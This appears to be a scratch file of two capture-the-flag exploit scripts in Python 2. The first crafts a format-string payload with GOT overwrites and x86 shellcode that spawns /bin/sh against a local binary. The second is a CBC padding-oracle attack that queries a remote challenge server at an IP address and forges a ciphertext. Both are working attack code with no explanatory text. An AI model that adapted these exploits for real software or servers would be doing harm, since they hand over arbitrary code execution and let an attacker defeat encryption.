# exploit.py
import sys
import struct
from subprocess import Popen

addr_got = int(sys.argv[1], 16)
addr_buf = int(sys.argv[2], 16)
index = int(sys.argv[3])

shellcode = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

buf = struct.pack('<I', addr_got)
buf += struct.pack('<I', addr_got+1)
buf += struct.pack('<I', addr_got+2)
buf += struct.pack('<I', addr_got+3)
buf += shellcode

a = map(ord, struct.pack('<I', addr_buf + 16))
a[3] = ((a[3]-a[2]-1) % 0x100) + 1
a[2] = ((a[2]-a[1]-1) % 0x100) + 1
a[1] = ((a[1]-a[0]-1) % 0x100) + 1
a[0] = ((a[0]-len(buf)-1) % 0x100) + 1

buf += "%%%dc%%%d$hhn" % (a[0], index)
buf += "%%%dc%%%d$hhn" % (a[1], index+1)
buf += "%%%dc%%%d$hhn" % (a[2], index+2)
buf += "%%%dc%%%d$hhn" % (a[3], index+3)

with open('buf', 'wb') as f:
    f.write(buf)

p = Popen(['./a.out', buf])
p.wait()


#---------------

import socket

def xor(a, b):
    return ''.join(chr(ord(x) ^ ord(y)) for x, y in zip(a, b))

c0 = '4a5b8d0034e5469c071b60000ca134d9e04f07e4dcd6cf096b47ba48b357814e4a89ef1cfad33e1dd28b892ba7233285'.decode('hex')[:16]
m0 = 'The quick brown fox jumps over the lazy dog'[:16]

"""
x = []
for i in xrange(16):
    for c in xrange(256):
        s = socket.create_connection(('52.69.125.71', 4443))
        s.recv(8192)
        s.recv(8192)
        s.sendall('2\n')
        buf = chr(c)
        buf += ''.join(chr(c) for c in x)
        buf = buf.rjust(16, '\x00')
        print "%r" % buf
        buf += c0
        s.sendall(buf.encode('hex') + '\n')
        result = s.recv(8192)
        if not "/home/letsdecrypt/letsdecrypt.rb:27:in `final'" in result:
            x = [c] + x
            print ''.join(chr(c) for c in x)
            x = [c ^ (i+1) ^ (i+2) for c in x]
            break
    else:
        break
"""

x = '\x16L\x1bTQ\x08Y:-\x10\x02\x0e\x05G&t'
print xor(xor(x, m0), '\x10'*16)
